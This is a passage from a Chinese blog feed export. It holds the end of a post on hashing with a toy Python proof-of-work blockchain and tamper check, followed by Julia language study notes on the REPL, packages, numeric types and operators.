<p>Bob进行验证<br><img src="/2023/02/01/hash/image-20230201151101827.png" alt="image-20230201151101827"><br>可以看到hash值是一样的，所以在传输过程中，信息没有被篡改。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">secret_phrase = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash_with_secret_phrase</span>(<span class="params">input_data, secret_phrase</span>):</span><br><span class="line">    combined = input_data + secret_phrase</span><br><span class="line">    <span class="keyword">return</span> sha256(combined.encode()).hexdigest()</span><br><span class="line">email_body = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(get_hash_with_secret_phrase(email_body,  secret_phrase))</span><br></pre></td></tr></table></figure>
<h2 id="工作量证明-proofs-of-work"><a href="#工作量证明-proofs-of-work" class="headerlink" title="工作量证明(proofs of work)"></a>工作量证明(proofs of work)</h2><p>通过在M后面加上某个S，使得hash(M+S)满足一定需求，在比特币的应用里，diffcult=4时，需要hash值前面有4个0，假定hash生产256位，而满足这个条件的概率为$1/2^{4}$</p>
<p>在这个算法基础上可以看到机器计算一个符合条件的S是困难的，但是对于验证方来说验证时简单的</p>
<h2 id="简单构造区块链代码"><a href="#简单构造区块链代码" class="headerlink" title="简单构造区块链代码"></a>简单构造区块链代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>:</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,index,timestamp,data,previousHash=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        </span><br><span class="line">        self.index = index</span><br><span class="line">        self.timestamp = timestamp</span><br><span class="line">        self.data = data</span><br><span class="line">        self.previousHash = previousHash</span><br><span class="line">        self.nonce = <span class="number">0</span> <span class="comment">#代表当前计算了多少次hash计算</span></span><br><span class="line">        self.<span class="built_in">hash</span> = self.calculateHash()</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calculateHash</span>(<span class="params">self</span>):</span><br><span class="line">        plainData = <span class="built_in">str</span>(self.index)+<span class="built_in">str</span>(self.timestamp)+<span class="built_in">str</span>(self.data)+<span class="built_in">str</span>(self.nonce)</span><br><span class="line">        <span class="keyword">return</span> sha256(plainData.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="comment">#挖矿 difficulty代表复杂度 表示前difficulty位都为0才算成功</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minerBlock</span>(<span class="params">self,difficulty</span>):</span><br><span class="line">        <span class="keyword">while</span>(self.<span class="built_in">hash</span>[<span class="number">0</span>:difficulty]!=<span class="built_in">str</span>(<span class="number">0</span>).zfill(difficulty)):<span class="comment"># 比较当前hash值前difficulty位是否为0</span></span><br><span class="line">            self.nonce+=<span class="number">1</span></span><br><span class="line">            self.<span class="built_in">hash</span> = self.calculateHash()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(self.__dict__)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BlockChain</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.chain = [self.createGenesisBlock()]</span><br><span class="line">        self.difficulty = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">createGenesisBlock</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> Block(<span class="number">0</span>,time.asctime(time.localtime(time.time())),<span class="string">&quot;Genesis Block&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getLatestBlock</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.chain[<span class="built_in">len</span>(self.chain)-<span class="number">1</span>]</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addBlock</span>(<span class="params">self,newBlock</span>):</span><br><span class="line">        newBlock.previousHash = self.getLatestBlock().<span class="built_in">hash</span></span><br><span class="line">        newBlock.minerBlock(self.difficulty)</span><br><span class="line">        self.chain.append(newBlock)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(self.__dict__)    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">chainIsValid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(self.chain)):</span><br><span class="line">            currentBlock = self.chain[index]</span><br><span class="line">            previousBlock = self.chain[index-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> (currentBlock.<span class="built_in">hash</span> != currentBlock.calculateHash()):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> previousBlock.<span class="built_in">hash</span> != currentBlock.previousHash:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">                  </span><br><span class="line">myCoin = BlockChain()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面打印了每个区块挖掘需要的时间 比特币通过一定的机制控制在10分钟出一个块 </span></span><br><span class="line"><span class="comment"># 其实就是根据当前网络算力 调整我们上面difficulty值的大小,如果你在</span></span><br><span class="line"><span class="comment"># 本地把上面代码difficulty的值调很大你可以看到很久都不会出计算结果</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;startMinerFirstBlockTime = time.time()</span></span><br><span class="line"><span class="string">print(&quot;start to miner first block time :&quot;+str(startMinerFirstBlockTime))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">myCoin.addBlock(Block(1,time.asctime(time.localtime(time.time())),&quot;second block&quot;))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(&quot;miner first block time completed&quot; + &quot;,used &quot; +str(time.time()-startMinerFirstBlockTime) +&quot;s\n&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">startMinerSecondBlockTime = time.time()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(&quot;start to miner second block time :&quot;+str(startMinerSecondBlockTime))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">myCoin.addBlock(Block(2,time.asctime(time.localtime(time.time())),&quot;third block&quot;))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(&quot;miner second block time completed&quot; + &quot;,used &quot; +str(time.time()-startMinerSecondBlockTime) +&quot;s\n&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Subsequent_block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    startMinerFirstBlockTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start to miner %d block time :&quot;</span> %Subsequent_block +<span class="built_in">str</span>(startMinerFirstBlockTime) )</span><br><span class="line">    myCoin.addBlock(Block(Subsequent_block,time.asctime(time.localtime(time.time())),<span class="string">&quot;第%d个区块&quot;</span> % Subsequent_block ))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;miner %d block time completed&quot;</span>% Subsequent_block + <span class="string">&quot;,used &quot;</span> +<span class="built_in">str</span>(time.time()-startMinerFirstBlockTime) +<span class="string">&quot;s\n&quot;</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#print block info</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;print block info ####:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> block <span class="keyword">in</span> myCoin.chain:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(block)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#check blockchain is valid</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;before tamper block,blockchain is valid ###&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(myCoin.chainIsValid())</span><br><span class="line"></span><br><span class="line"><span class="comment">#tamper the blockinfo</span></span><br><span class="line">myCoin.chain[<span class="number">1</span>].data = <span class="string">&quot;&#123;amount:1002&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;after tamper block,blockchain is valid ###&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(myCoin.chainIsValid())</span><br></pre></td></tr></table></figure>
<p>该代码在创建完创世区块之后，又计算了4个新区块，其中minerBlock为工作量证明相关代码</p>
<p>输出结果<img src="/2023/02/01/hash/image-20230201171726099.png" alt="image-20230201171726099"></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>julia</title>
    <url>/2023/01/30/julia/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>学习julia语言</p>
<span id="more"></span>
<h1 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1 基本使用"></a>1 基本使用</h1><h2 id="1-1-juila交互式会话"><a href="#1-1-juila交互式会话" class="headerlink" title="1.1 juila交互式会话"></a>1.1 juila交互式会话</h2><p><img src="/2023/01/30/julia/image-20230202224954022.png" alt="image-20230202224954022"></p>
<p>以分号结尾则不会显示出来结果<br>变量<strong>ans</strong>总会存储上一次执行代码的结果（ans只在交互式会话中才有）</p>
<p>在交互式会话中，要运行写在源文件 <code>test.jl</code> 中的代码，只需输入 <code>include(&quot;test.jl&quot;)</code>。<br><img src="/2023/01/30/julia/image-20230218225647958.png" alt="image-20230218225647958"></p>
<p>如果想以非交互的方式执行文件中的代码，可以把文件名作为 <code>julia</code> 命令的第一个参数：</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">$ julia script.jl arg1 arg2...</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/30/julia/image-20230218230659158.png" alt="image-20230218230659158"></p>
<p>如这个例子所示，<code>julia</code> 后跟着的命令行参数会被作为程序 <code>test.jl</code> 的命令行参数。这些参数使用全局常量 <code>ARGS</code> 来传递，脚本自身的名字会以全局变量 <code>PROGRAM_FILE</code> 传入。注意当脚本以命令行里的 <code>-e</code> 选项输入时，<code>ARGS</code> 也会被设定但是 <code>PROGRAM_FILE</code> 会是空的。例如，要把一个脚本的输入参数显示出来，你可以：</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">$ julia -e &#x27;println(<span class="literal">PROGRAM_FILE</span>); <span class="keyword">for</span> x <span class="keyword">in</span> <span class="literal">ARGS</span>; println(x); <span class="keyword">end</span>&#x27; foo bar</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/30/julia/image-20230218231204508.png" alt="image-20230218231204508"></p>
<p>或者把代码写到一个脚本文件中再执行：<br><img src="/2023/01/30/julia/image-20230218231906611.png" alt="image-20230218231906611"><br><img src="/2023/01/30/julia/image-20230218232657552.png" alt="image-20230218232657552"></p>
<p>个性化<br><img src="/2023/01/30/julia/image-20230218235039033.png" alt="image-20230218235039033"><br><img src="/2023/01/30/julia/image-20230218235053508.png" alt="image-20230218235053508"></p>
<p>详细的命令： <a href="https://cn.julialang.org/JuliaZH.jl/latest/manual/command-line-options/#command-line-options">Command-line Options</a></p>
<h2 id="1-2-扩展包"><a href="#1-2-扩展包" class="headerlink" title="1.2 扩展包"></a>1.2 扩展包</h2><p>一些基本语言功能在Base扩展包中，Base扩展包中的函数都是可以直接使用的，不需要单独安装和声明。其他的一些功能则需要从网上安装，并且使用时需要声明。</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> &lt;packages&gt;</span><br></pre></td></tr></table></figure>
<p>在Julia命令行中安装扩展包，命令如下<br>如果安装的扩展包依赖于其他扩展包，这些扩展包也会自动被安装</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> Pkg</span><br><span class="line">Pkg.<span class="keyword">add</span>(<span class="string">&quot;&lt;packages&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>安装的扩展包如果不能正常工作，可以尝试从新构建</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> Pkg</span><br><span class="line">Pkg.build(<span class="string">&quot;&lt;packages&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>更新已安装的所有包到最新版本</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">Pkg.update<span class="comment">()</span></span><br></pre></td></tr></table></figure>
<p>在REPL命令行按”]”可以进入包管理环境</p>
<ul>
<li>查看扩展包管理命令——help</li>
<li>查看安装的扩展包列表<br><img src="/2023/01/30/julia/image-20230218182149235.png" alt="image-20230218182149235"></li>
<li>安装某个包——add xxx</li>
<li>使得包能够运行——build xxx</li>
<li>更新包到最新版本——update xxx</li>
<li>删除包——remove xxx</li>
</ul>
<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="2-1-整数与浮点数"><a href="#2-1-整数与浮点数" class="headerlink" title="2.1 整数与浮点数"></a>2.1 整数与浮点数</h2><p><img src="/2023/01/30/julia/image-20230222110137368.png" alt="image-20230222110137368" style="zoom:50%;"><img src="/2023/01/30/julia/image-20230222112215446.png" alt="image-20230222112215446"></p>
<p>此外，对<a href="https://cn.julialang.org/JuliaZH.jl/latest/manual/complex-and-rational-numbers/#复数和有理数">复数和有理数</a>的完整支持是在这些原始数据类型之上建立起来的。多亏了 Julia 有一个很灵活的、用户可扩展的<a href="https://cn.julialang.org/JuliaZH.jl/latest/manual/conversion-and-promotion/#conversion-and-promotion">类型提升系统</a>，所有的数值类型都无需显式转换就可以很自然地相互进行运算。</p>
<h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>julia允许使用特别长的整数，这是类型为BigInt。较长的整数常数可以写成如123_456_789这种格式。</p>
<p>julia的浮点数可以写成带点的形式如<code>123.0</code>, <code>1.23</code>，也可以写成带有10的幂次如1.23e^3^。这些写法都属于Float64类型的浮点数。julia还有些他类型浮点数，但是科学计算中主要使用Float64类型，在别的语言中称为双精度浮点数。</p>
<p>julia的布尔类型Bool只有两个值：true和false</p>
<p>用typeof()求某个值的类型<br><img src="/2023/01/30/julia/image-20230218183505343.png" alt="image-20230218183505343"><img src="/2023/01/30/julia/image-20230218183525289.png" alt="image-20230218183525289"><img src="/2023/01/30/julia/image-20230218183609875.png" alt="image-20230218183609875"><br><img src="/2023/01/30/julia/image-20230218183901536.png" alt="image-20230218183901536"><img src="/2023/01/30/julia/image-20230218183913507.png" alt="image-20230218183913507"><br><img src="/2023/01/30/julia/image-20230218183938732.png" alt="image-20230218183938732"><img src="/2023/01/30/julia/image-20230218183948269.png" alt="image-20230218183948269"></p>
<p>julia的内置变量Sys.WORD_SIZE表明了目标系统是32位还是64位架构<br><img src="/2023/01/30/julia/image-20230226105115636.png" alt="image-20230226105115636"></p>
<p>julia定义了Int与UInt类型，它们分别是系统有符号数和无符号的原生整数类型别名<br><img src="/2023/01/30/julia/image-20230226105416571.png" alt="image-20230226105416571"><img src="/2023/01/30/julia/image-20230226105430032.png" alt="image-20230226105430032"></p>
<p>超过32位表示范围大整数，如果能用64位表示，那么无论是什么系统都会用64位表示<br><img src="/2023/01/30/julia/image-20230226105632269.png" alt="image-20230226105632269"></p>
<p>无符号整数会通过0x前缀以及十六进制数0-9a-f来输入或输出，当然二进制和八进制也是支持的<br><img src="/2023/01/30/julia/image-20230226105744784.png" alt="image-20230226105744784"><img src="/2023/01/30/julia/image-20230226105958625.png" alt="image-20230226105958625"></p>
<h4 id="无符号数的补码"><a href="#无符号数的补码" class="headerlink" title="无符号数的补码"></a>无符号数的补码</h4><p>在字面量前面加一个符号-<br><img src="/2023/01/30/julia/image-20230226110506899.png" alt="image-20230226110506899"></p>
<h4 id="取值范围"><a href="#取值范围" class="headerlink" title="取值范围"></a>取值范围</h4><p>整型等原始数值类型的最大和最小可表示的值可用typemin和typemax函数得到<br><img src="/2023/01/30/julia/image-20230226112131562.png" alt="image-20230226112131562"></p>
<h4 id="溢出行为"><a href="#溢出行为" class="headerlink" title="溢出行为"></a>溢出行为</h4><p>超出一个类型可表示的最大值会导致环绕(wraparound)行为：<br><img src="/2023/01/30/julia/image-20230226124319390.png" alt="image-20230226124319390"><br>或者使用任意精度算术中的BigInt类型作为替代。<br><img src="/2023/01/30/julia/image-20230226124448790.png" alt="image-20230226124448790"></p>
<h4 id="除法错误"><a href="#除法错误" class="headerlink" title="除法错误"></a>除法错误</h4><p><code>div</code> 函数的整数除法有两种异常情况：除以零，以及使用 -1 去除最小的负数（<a href="https://cn.julialang.org/JuliaZH.jl/latest/base/base/#Base.typemin"><code>typemin</code></a>）。 这两种情况都会抛出一个 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/base/#Core.DivideError"><code>DivideError</code></a> 错误。 <code>rem</code> 取余函数和 <code>mod</code> 取模函数在除零时抛出 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/base/#Core.DivideError"><code>DivideError</code></a> 错误。<br><img src="/2023/01/30/julia/image-20230228110528331.png" alt="image-20230228110528331"><br><img src="/2023/01/30/julia/image-20230228110600764.png" alt="image-20230228110600764"><br><img src="/2023/01/30/julia/image-20230228110630494.png" alt="image-20230228110630494"><br><img src="/2023/01/30/julia/image-20230228110653247.png" alt="image-20230228110653247"></p>
<h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><p>E-表示法结果为Float64类型的值，使用f代替e可以得到Float32类型的字面量<br><img src="/2023/01/30/julia/image-20230228110853475.png" alt="image-20230228110853475"><img src="/2023/01/30/julia/image-20230228111014788.png" alt="image-20230228111014788"></p>
<p>转换为Float32类型<br><img src="/2023/01/30/julia/image-20230228111121677.png" alt="image-20230228111121677"></p>
<p>十六进制的浮点数字面量，但只适用于Float64类型的值。一般使用p前缀及以2为底的指数来表示<br><img src="/2023/01/30/julia/image-20230228112056170.png" alt="image-20230228112056170"><img src="/2023/01/30/julia/image-20230228112109916.png" alt="image-20230228112109916"><img src="/2023/01/30/julia/image-20230228112125388.png" alt="image-20230228112125388"></p>
<p>下划线 <code>_</code> 可用作数字分隔符：<br><img src="/2023/01/30/julia/image-20230228112307999.png" alt="image-20230228112307999"></p>
<h4 id="浮点数中的零"><a href="#浮点数中的零" class="headerlink" title="浮点数中的零"></a>浮点数中的零</h4><p>浮点数有<a href="https://en.wikipedia.org/wiki/Signed_zero">两种零</a>，正零和负零。它们相互相等但有着不同的二进制表示，可以使用 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.bitstring"><code>bitstring</code></a> 函数来查看：函数产生一个Int64类型的字面量<br><img src="/2023/01/30/julia/image-20230228112431651.png" alt="image-20230228112431651"></p>
<h4 id="特殊的浮点值"><a href="#特殊的浮点值" class="headerlink" title="特殊的浮点值"></a>特殊的浮点值</h4><p>Inf：正无穷<br>-Inf：负无穷<br>NaN：不是数——一个不和任何浮点值(包括自己)相等的值<br><img src="/2023/01/30/julia/image-20230228112911873.png" alt="image-20230228112911873"><img src="/2023/01/30/julia/image-20230228112930178.png" alt="image-20230228112930178"><img src="/2023/01/30/julia/image-20230228112952844.png" alt="image-20230228112952844"></p>
<h4 id="机器精度"><a href="#机器精度" class="headerlink" title="机器精度"></a>机器精度</h4><p>eps函数：给出1.0与下一个julia能表示的浮点数之间的差值<br><img src="/2023/01/30/julia/image-20230228113309098.png" alt="image-20230228113309098"><br><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/base/#Base.eps-Tuple{Type{&lt;:AbstractFloat}}"><code>eps</code></a> 函数也可以接受一个浮点值作为参数，然后给出这个值与下一个可表示的浮点数值之间的绝对差。也就是说，<code>eps(x)</code> 产生一个和 <code>x</code> 类型相同的值，并且 <code>x + eps(x)</code> 恰好是比 <code>x</code> 更大的下一个可表示的浮点值<br><img src="/2023/01/30/julia/image-20230228202237370.png" alt="image-20230228202237370"><img src="/2023/01/30/julia/image-20230228202254888.png" alt="image-20230228202254888" style="zoom:80%;"><img src="/2023/01/30/julia/image-20230228202315873.png" alt="image-20230228202315873" style="zoom:80%;"></p>
<p>Julia 也提供了 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.nextfloat"><code>nextfloat</code></a> 和 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.prevfloat"><code>prevfloat</code></a> 两个函数分别返回基于参数的下一个更大或更小的可表示的浮点数：<br><img src="/2023/01/30/julia/image-20230228202535738.png" alt="image-20230228202535738"></p>
<p>相邻可表示的浮点数也有着相邻的二进制整数表示<img src="/2023/01/30/julia/image-20230228202724056.png" alt="image-20230228202724056"></p>
<h4 id="舍入模式"><a href="#舍入模式" class="headerlink" title="舍入模式"></a>舍入模式</h4><p>一个数如果没有精确的浮点表示，就必须被舍入到一个合适的可表示的值。然而，如果想的话，可以根据舍入模式改变舍入的方式，如 <a href="https://en.wikipedia.org/wiki/IEEE_754-2008">IEEE 754 标准</a> 所述。</p>
<p>Julia 所使用的默认模式总是 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.Rounding.RoundNearest"><code>RoundNearest</code></a>，指舍入到最接近的可表示的值，这个被舍入的值会使用尽量少的有效位数。</p>
<h3 id="数值字面量系数"><a href="#数值字面量系数" class="headerlink" title="数值字面量系数"></a>数值字面量系数</h3><p><img src="/2023/01/30/julia/image-20230228203730873.png" alt="image-20230228203730873"></p>
<p>此外，括号表达式可以被用作变量的系数，暗指表达式与变量相乘，但是不允许将两个括号表达式并列或者把变量放在括号表达式之前，都不会被用作暗指乘法<br><img src="/2023/01/30/julia/image-20230228204026350.png" alt="image-20230228204026350"></p>
<h4 id="语法冲突"><a href="#语法冲突" class="headerlink" title="语法冲突"></a>语法冲突</h4><ul>
<li><code>0x</code> /<code>0o</code>/<code>0b</code> 开头的表达式总是十六进制/八进制/二进制字面量。</li>
<li>数值开头跟着 <code>e</code> 和 <code>E</code> 的表达式总是浮点字面量。</li>
<li>数值开头跟着 <code>f</code> 的表达式总是 32-bit 浮点字面量。</li>
</ul>
<h4 id="0和1的字面量"><a href="#0和1的字面量" class="headerlink" title="0和1的字面量"></a>0和1的字面量</h4><div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>zero(x)</td>
<td>x类型或变量x的类型的零字面量</td>
</tr>
<tr>
<td>one(x)</td>
<td>x类型或变量x的类型的一字面量</td>
</tr>
</tbody>
</table>
</div>
<p><img src="/2023/01/30/julia/image-20230228204540945.png" alt="image-20230228204540945"><img src="/2023/01/30/julia/image-20230228204559078.png" alt="image-20230228204559078"></p>
<h2 id="2-2-四则运算"><a href="#2-2-四则运算" class="headerlink" title="2.2 四则运算"></a>2.2 四则运算</h2><p>浮点数的四则运算遵循传统的算数运算规则和优先级规定。<br><img src="/2023/01/30/julia/image-20230218184753696.png" alt="image-20230218184753696"></p>
<p>在交互运行时，特殊变量ans表示最后一个计算过的表达式的值。<br><img src="/2023/01/30/julia/image-20230218184833387.png" alt="image-20230218184833387"></p>
<p>习惯上我们会把优先运算的操作符紧邻操作数，比如 <code>-x + 2</code> 表示先要给 <code>x</code> 取反，然后再加 <code>2</code> 。<br>在乘法操作中，<code>false</code> 被视作 <strong>零</strong>。<br><img src="/2023/01/30/julia/image-20230302100115212.png" alt="image-20230302100115212"></p>
<h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>整数加法、减法、乘法结果仍为整数，整数的表示范围有限，有可能发生溢出，而且溢出时julia并不出错而且也不提示。</p>
<p>整数用”/“作的出发总是返回浮点数，即使结果是整数也是一样<br><img src="/2023/01/30/julia/image-20230218185300964.png" alt="image-20230218185300964"></p>
<p>求整数除法的商，用 $\div$ 运算符，如<br><img src="/2023/01/30/julia/image-20230218220735381.png" alt="image-20230218220735381"></p>
<p>模运算用%运算符，结果符号总是取a的符号。也可以写成rem(a,b)<br><img src="/2023/01/30/julia/image-20230218220913217.png" alt="image-20230218220913217"><img src="/2023/01/30/julia/image-20230218220918568.png" alt="image-20230218220918568"><img src="/2023/01/30/julia/image-20230218220943477.png" alt="image-20230218220943477"><br><code>divrem(x,y)</code>同时返回x除以y的商和余数<br><img src="/2023/01/30/julia/image-20230218221056392.png" alt="image-20230218221056392"></p>
<p>整数与浮点数的混合运算会将整数转换成浮点数再计算</p>
<h3 id="布尔运算符"><a href="#布尔运算符" class="headerlink" title="布尔运算符"></a>布尔运算符</h3><div class="table-container">
<table>
<thead>
<tr>
<th>表达式</th>
<th>名称</th>
</tr>
</thead>
<tbody>
<tr>
<td>!x</td>
<td>否定</td>
</tr>
<tr>
<td>x &amp;&amp; y</td>
<td>短路与</td>
</tr>
<tr>
<td>x \</td>
<td>\</td>
<td>y</td>
<td>短路或</td>
</tr>
</tbody>
</table>
</div>
<h4 id="短路与逻辑的区别"><a href="#短路与逻辑的区别" class="headerlink" title="短路与逻辑的区别"></a>短路与逻辑的区别</h4><p>&amp;&amp;（短路与）和&amp;（逻辑与）的时候：有假则为假，全真则为真（有假必假，全真为真）</p>
<p> ||（短路或）和|（逻辑或）的时候：有真则为真，全假则为假（有真必真，全假为假）</p>
<p>逻辑与和短路与的区别：<br>逻辑与的判断方式是：从左到右依次判断，直到结尾（逻辑全程运算）<br>短路与的判断方式是: 从左到右依次判断，直到出现false为止将不再判断，直接得到结果为false（短路遇false就停）</p>
<p>逻辑或和短路或的区别 逻辑或的判断方式是：从左到右依次判断，直到结尾<br>短路或的判断方式是: 从左到右依次判断，直到出现true为止将不再判断，直接得到结果为true</p>
<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">表达式</th>
<th style="text-align:left">名称</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~x</code></td>
<td style="text-align:left">按位取反</td>
</tr>
<tr>
<td style="text-align:left"><code>x &amp; y</code></td>
<td style="text-align:left">按位与</td>
</tr>
<tr>
<td style="text-align:left">`x</td>
<td style="text-align:left">y`</td>
<td>按位或</td>
</tr>
<tr>
<td style="text-align:left"><code>x ⊻ y</code>   (xor)</td>
<td style="text-align:left">按位异或（逻辑异或）</td>
</tr>
<tr>
<td style="text-align:left"><code>x ⊼ y</code>   (nand)</td>
<td style="text-align:left">按位与（非与）</td>
</tr>
<tr>
<td style="text-align:left"><code>x ⊽ y</code>   (nor)</td>
<td style="text-align:left">按位或（非或）</td>
</tr>
<tr>
<td style="text-align:left"><code>x &gt;&gt;&gt; y</code></td>
<td style="text-align:left"><a href="https://en.wikipedia.org/wiki/Logical_shift">逻辑右移</a></td>
</tr>
<tr>
<td style="text-align:left"><code>x &gt;&gt; y</code></td>
<td style="text-align:left"><a href="https://en.wikipedia.org/wiki/Arithmetic_shift">算术右移</a></td>
</tr>
<tr>
<td style="text-align:left"><code>x &lt;&lt; y</code></td>
<td style="text-align:left">逻辑/算术左移</td>
</tr>
</tbody>
</table>
</div>
<p><img src="/2023/01/30/julia/image-20230302182701715.png" alt="image-20230302182701715"><br>~4 = b0000 0000 0000 0000 0000 0000 0000 0100<br>执行~运算：1111 1111 1111 1111 1111 1111 1111 1011<br>即补码是1011.原码为0101，加上符号位即-5<br><img src="/2023/01/30/julia/image-20230302183044846.png" alt="image-20230302183044846"><br>xor(4,3) = xor(0100,0011) = 0111，即7</p>
<p>算数移位和逻辑移位；算数右移补符号位，左移补零；逻辑移位不考虑符号位，左移和右移只补零。</p>
<h3 id="复合赋值运算符"><a href="#复合赋值运算符" class="headerlink" title="复合赋值运算符"></a>复合赋值运算符</h3><p>每一个二元运算符和位运算符都可以给左操作数复合赋值：方法是把 <code>=</code> 直接放在二元运算符后面。</p>
<p><img src="/2023/01/30/julia/image-20230302183343680.png" alt="image-20230302183343680"></p>
<p>二元运算符和位运算符的复合赋值操作符有下面几种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+=  -=  *=  /=  \=  ÷=  %=  ^=  &amp;=  |=  ⊻=  &gt;&gt;&gt;=  &gt;&gt;=  &lt;&lt;=</span><br></pre></td></tr></table></figure>
<p>复合赋值后会把变量重新绑定到左操作数上，所以变量的类型可能会改变。<br><img src="/2023/01/30/julia/image-20230302184524889.png" alt="image-20230302184524889"></p>
